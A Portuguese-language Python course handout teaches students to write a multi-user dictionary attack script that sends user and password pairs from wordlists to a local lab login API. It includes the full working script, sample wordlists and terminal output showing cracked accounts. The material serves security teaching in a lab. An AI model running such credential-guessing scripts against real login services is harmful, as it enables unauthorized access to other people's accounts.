# Apostila Prática: Automação de Ataque de Dicionário com Múltiplos Usuários

**Público-alvo:** Alunos em fase de aprendizado prático em Python  
**Módulo:** UC11 — Requests, Manipulação de Arquivos e Testes Automatizados  
**Ambiente de Laboratório:** NexusBank Corporate  

---

## 1. Contexto e Objetivo

No exercício anterior, o alvo era fixo: sabíamos previamente que o usuário era `"ana"` e precisávamos apenas testar variações de senhas.

Em auditorias de segurança e testes de intrusão reais, é comum coletar uma lista de possíveis contas (por exemplo, nomes de colaboradores ou logins comuns de sistema) e tentar combinações de senhas fracas para cada uma dessas contas.

Para automatizar esse cenário, utilizaremos **dois arquivos de texto**:
1. `usuarios.txt`: Lista contendo um nome de usuário por linha.
2. `senhas.txt`: Lista contendo uma senha candidata por linha.

```text
usuarios.txt          senhas.txt
┌──────────┐          ┌──────────┐
│ ana      │          │ 123456   │
│ bruno    │          │ senha123 │
│ carlos   │          │ admin123 │
│ admin    │          │ qwerty   │
└──────────┘          └──────────┘
```

---

## 2. Conceito-Chave: Laços de Repetição Aninhados (Loop dentro de Loop)

Para testar todas as senhas para cada um dos usuários da lista, a estrutura lógica necessária é um **laço aninhado**.

O funcionamento é direto e sequencial:
1. O primeiro laço (externo) seleciona o primeiro usuário da lista: `"ana"`.
2. O segundo laço (interno) percorre **toda** a lista de senhas testando cada uma contra a conta `"ana"`.
3. Ao finalizar as tentativas para a `"ana"` (ou encontrar a senha correta), o laço externo avança para o segundo usuário: `"bruno"`.
4. O laço interno é reiniciado, testando novamente as senhas para o `"bruno"`, e assim sucessivamente.

```text
[Usuário selecionado: ana]
   ├── Testa senha: "111111"
   ├── Testa senha: "password"
   └── Testa senha: "123456" -> Sucesso (200)! Interrompe e avança.

[Usuário selecionado: bruno]
   ├── Testa senha: "111111"
   ├── Testa senha: "password"
   └── Testa senha: "senha123" -> Sucesso (200)! Interrompe e avança.
```

---

## 3. Gestão de Leitura dos Arquivos: Evitando o Esgotamento do Ponteiro

Em Python, se você tentar iterar sobre um arquivo de texto aberto diretamente em disco dentro de dois laços `for`, ocorrerá um comportamento inesperado:

```python
# Abordagem com limitação de leitura sequencial:
with open("usuarios.txt") as arq_users:
    with open("senhas.txt") as arq_pass:
        for u in arq_users:
            for s in arq_pass:
                # Na primeira conta (ana), o arquivo de senhas é lido até o final.
                # Para a segunda conta (bruno), o ponteiro de leitura já está no fim do arquivo,
                # e nenhuma senha é testada!
```

### Solução Recomendada: Carregar o Conteúdo para Listas na Memória
Como as listas de laboratório possuem tamanho moderado, a abordagem mais eficiente é carregar as palavras diretamente para estruturas de lista em memória utilizando `.read().splitlines()`:

```python
# Carrega os usuários em uma lista
with open("usuarios.txt", "r") as arq_u:
    usuarios = arq_u.read().splitlines()

# Carrega as senhas em outra lista
with open("senhas.txt", "r") as arq_s:
    senhas = arq_s.read().splitlines()
```

O método `.splitlines()` oferece duas vantagens diretas:
1. Divide o conteúdo do arquivo em elementos individuais de uma lista Python.
2. Remove automaticamente os caracteres de terminação de linha (`\n`), eliminando a necessidade de chamar `.strip()` manualmente em cada iteração.

---

## 4. O Papel do `break` em Laços Aninhados

Quando a requisição HTTP retorna código `200`, a senha correta daquele usuário específico foi localizada.

O comando `break` encerra **apenas o laço interno** (o laço de senhas).  
Com isso, o script não gasta tempo testando as demais senhas para quem já foi autenticado e passa imediatamente para o próximo usuário da lista externa.

---

## 5. Código Completo: `bruteforce_multi_usuarios.py`

Copie e salve o código a seguir no arquivo `bruteforce_multi_usuarios.py`:

```python
import requests

# ==============================================================================
# 1. PARÂMETROS DE EXECUÇÃO
# ==============================================================================
# Endpoint de autenticação do laboratório
url = "http://127.0.0.1:8002/login"

arquivo_usuarios = "usuarios.txt"
arquivo_senhas = "senhas.txt"

print("=" * 60)
print("   INICIANDO TESTE DE AUTENTICAÇÃO COM MÚLTIPLOS USUÁRIOS")
print("=" * 60)

# ==============================================================================
# 2. CARREGAMENTO DOS DADOS PARA A MEMÓRIA
# ==============================================================================
with open(arquivo_usuarios, "r") as arq_u:
    usuarios = arq_u.read().splitlines()

with open(arquivo_senhas, "r") as arq_s:
    senhas = arq_s.read().splitlines()

print(f"Total de usuários carregados : {len(usuarios)}")
print(f"Total de senhas carregadas   : {len(senhas)}")
print("=" * 60)

# ==============================================================================
# 3. EXECUÇÃO DOS LAÇOS ANINHADOS (USUÁRIO x SENHA)
# ==============================================================================
for usuario in usuarios:
    print(f"\n[+] Testando conta: {usuario}")
    senha_encontrada = False

    for senha in senhas:
        # Monta a estrutura da requisição
        dados = {
            "usuario": usuario,
            "senha": senha
        }

        # Dispara a requisição HTTP POST para a API
        resposta = requests.post(url, json=dados)

        print(f"    Tentativa com senha '{senha}' -> Status: {resposta.status_code}")

        # Avalia se a credencial foi aceita pelo servidor
        if resposta.status_code == 200:
            print(f"    >>> SUCESSO! A senha do usuário '{usuario}' é: '{senha}' <<<")
            senha_encontrada = True
            break  # Interrompe o laço de senhas e avança para o próximo usuário

    if not senha_encontrada:
        print(f"    [-] Nenhuma senha da lista foi válida para o usuário '{usuario}'.")

print("\n" + "=" * 60)
print("Processo concluído para todos os usuários da lista.")
print("=" * 60)
```

---

## 6. Análise Linha a Linha do Código

| Linhas | Instrução | Descrição Técnica |
| :--- | :--- | :--- |
| `1` | `import requests` | Carrega o cliente HTTP para envio de requisições web. |
| `7` | `url = ...` | Define a rota de destino no servidor. |
| `9–10` | `arquivo_usuarios`, `arquivo_senhas` | Especifica os nomes dos arquivos `.txt` contendo as listas de entrada. |
| `18–22`| `with open(...) as ... splitlines()` | Realiza a leitura integral de ambos os arquivos para listas na memória, eliminando quebras de linha (`\n`). |
| `29` | `for usuario in usuarios:` | **Laço Externo:** Itera sobre cada nome presente na lista de usuários. |
| `31` | `senha_encontrada = False` | Inicializa uma variável de controle (flag booleana) para registrar se houve sucesso para o usuário atual. |
| `33` | `for senha in senhas:` | **Laço Interno:** Itera sobre as senhas disponíveis para o usuário selecionado no momento. |
| `35–38`| `dados = {"usuario": ..., "senha": ...}` | Monta o dicionário contendo as credenciais da tentativa atual. |
| `41` | `resposta = requests.post(url, json=dados)` | Envia os dados em formato JSON para o servidor e aguarda a resposta. |
| `43` | `print(...)` | Exibe no terminal a senha testada e o status HTTP retornado. |
| `46` | `if resposta.status_code == 200:` | Verifica se a tentativa retornou código de autenticação bem-sucedida. |
| `47–49`| `print(...)`, `senha_encontrada = True`, `break` | Registra a descoberta, atualiza o marcador de controle e interrompe o laço interno de senhas. |
| `51–52`| `if not senha_encontrada:` | Caso todas as senhas tenham sido testadas sem retorno 200, informa que a credencial não consta na lista. |

---

## 7. Roteiro Prático de Laboratório

### 1. Criar os arquivos de entrada
No mesmo diretório do script, crie os dois arquivos abaixo:

**`usuarios.txt`**
```text
ana
bruno
carlos
admin
```

**`senhas.txt`**
```text
111111
senha123
123456
admin123
qwerty
```

### 2. Executar o script
```bash
python bruteforce_multi_usuarios.py
```

### 3. Saída de terminal esperada
```text
============================================================
   INICIANDO TESTE DE AUTENTICAÇÃO COM MÚLTIPLOS USUÁRIOS
============================================================
Total de usuários carregados : 4
Total de senhas carregadas   : 5
============================================================

[+] Testando conta: ana
    Tentativa com senha '111111' -> Status: 401
    Tentativa com senha 'senha123' -> Status: 401
    Tentativa com senha '123456' -> Status: 200
    >>> SUCESSO! A senha do usuário 'ana' é: '123456' <<<

[+] Testando conta: bruno
    Tentativa com senha '111111' -> Status: 401
    Tentativa com senha 'senha123' -> Status: 200
    >>> SUCESSO! A senha do usuário 'bruno' é: 'senha123' <<<

[+] Testando conta: carlos
    Tentativa com senha '111111' -> Status: 401
    Tentativa com senha 'senha123' -> Status: 401
    Tentativa com senha '123456' -> Status: 401
    Tentativa com senha 'admin123' -> Status: 401
    Tentativa com senha 'qwerty' -> Status: 401
    [-] Nenhuma senha da lista foi válida para o usuário 'carlos'.

[+] Testando conta: admin
    Tentativa com senha '111111' -> Status: 401
    Tentativa com senha 'senha123' -> Status: 401
    Tentativa com senha '123456' -> Status: 401
    Tentativa com senha 'admin123' -> Status: 403
    Tentativa com senha 'qwerty' -> Status: 401
    [-] Nenhuma senha da lista foi válida para o usuário 'admin'.

============================================================
Processo concluído para todos os usuários da lista.
============================================================
```

> **Nota Técnica sobre o Usuário Admin (Status 403):**  
> Note que para o usuário `admin` com a senha correta `admin123`, a API retornou código **403 (Forbidden)** em vez de 200.  
> Isso ocorre pelo design de arquitetura da aplicação: a rota `/login` aceita apenas o papel de `cliente`. Contas administrativas e corporativas exigem autenticação na rota `/admin/login`, conforme abordado nos exercícios finais do laboratório.
